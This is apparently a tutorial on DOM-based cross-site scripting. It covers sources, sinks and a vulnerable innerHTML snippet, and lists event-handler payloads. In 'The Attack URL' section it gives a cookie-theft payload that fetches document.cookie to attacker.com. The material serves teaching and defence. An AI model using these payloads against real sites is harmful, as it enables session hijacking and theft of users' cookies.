# DOM-Based XSS

DOM XSS is the only XSS type where the server is completely uninvolved in the vulnerability. The payload never leaves the browser, making it invisible to server-side logging, WAFs, and any security controls that inspect HTTP traffic.

***

## How DOM XSS Differs from Reflected XSS

The distinguishing characteristic is network traffic. Opening the browser's Network tab while triggering a DOM XSS vulnerability shows zero HTTP requests for the payload. The URL uses a hash fragment (`#`) to pass the parameter:

```
http://target.com/#task=test
```

Everything after `#` is a client-side anchor that the browser never sends to the server. The JavaScript on the page reads it directly from `document.URL` and writes it to the DOM after the page has already loaded.

This also explains why the standard page source (Ctrl+U) does not contain the injected content: page source reflects the original HTML delivered by the server, before any JavaScript has executed. The rendered DOM (Ctrl+Shift+C / Web Inspector) shows the live state of the page including JavaScript-injected content.

***

## Source and Sink Model

DOM XSS analysis revolves around two concepts:

**Source**: Where the attacker-controlled input enters the JavaScript environment

Common sources:
- `document.URL`
- `document.location`
- `window.location.hash`
- `document.referrer`
- `window.name`
- `localStorage` / `sessionStorage`

**Sink**: Where that input is written into the DOM

Dangerous sinks that execute injected HTML/JS:

| Sink | Context |
|------|---------|
| `innerHTML` | Writes raw HTML, blocks `<script>` but allows event handlers |
| `outerHTML` | Replaces element including its own tag |
| `document.write()` | Writes directly to the document |
| `eval()` | Executes string as JavaScript directly |
| `setTimeout(str)` | Executes string argument as JS |
| `jQuery.html()` | Sets inner HTML via jQuery |
| `jQuery.append()` | Appends HTML content |
| `jQuery.after()` | Inserts HTML after element |

The vulnerable code from the example illustrates the full source-to-sink data flow:

```javascript
// SOURCE: reads from URL parameter
var pos = document.URL.indexOf("task=");
var task = document.URL.substring(pos + 5, document.URL.length);

// SINK: writes unsanitised input directly into DOM
document.getElementById("todo").innerHTML =
  "<b>Next Task:</b> " + decodeURIComponent(task);
```

No sanitisation occurs between source and sink, making this directly exploitable.

***

## Why `<script>` Tags Fail in innerHTML

`innerHTML` has a built-in browser restriction that ignores `<script>` tags as a partial security measure. Dynamically inserted script tags via innerHTML do not execute. This means the standard `<script>alert(1)</script>` payload fails, but event-handler-based payloads succeed:

```html
<!-- Works in innerHTML context -->
<img src="" onerror=alert(window.origin)>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
```

The `<img>` payload works because:
1. `innerHTML` allows image tags
2. An empty or invalid `src` attribute triggers the `onerror` event
3. The `onerror` event handler executes arbitrary JavaScript
4. The broken image is invisible to the user

***

## The Attack URL

The full DOM XSS attack URL for this example:

```
http://target.com/#task=<img src='' onerror=alert(window.origin)>
```

For actual data exfiltration:

```
http://target.com/#task=<img src='' onerror="fetch('http://attacker.com/steal?c='+document.cookie)">
```

Because the hash fragment is client-side only, the server logs show nothing unusual: just a normal page request for `/`. The malicious payload is invisible to any server-side security monitoring or WAF, which is what makes DOM XSS particularly difficult to detect and defend against at the infrastructure level.

***

## Comparing All Three XSS Types

| Aspect | Stored | Reflected | DOM-based |
|--------|--------|-----------|-----------|
| Server involvement | Stores and serves payload | Reflects payload in response | None |
| Visible in server logs | Yes | Yes | No (hash fragment never sent) |
| Survives page refresh | Yes | No | No |
| Victims affected | All page visitors | Recipients of crafted link | Recipients of crafted link |
| WAF can detect | Usually | Usually | No (never reaches WAF) |
| Payload in page source | Yes | Yes | No (injected post-load) |
| Script tags work | Yes | Yes | No (in innerHTML sinks) |

DOM XSS requires understanding JavaScript source and sink flow rather than just looking for reflected input in the HTML response, which is why it is frequently missed by automated scanners and requires manual code review to identify reliably.
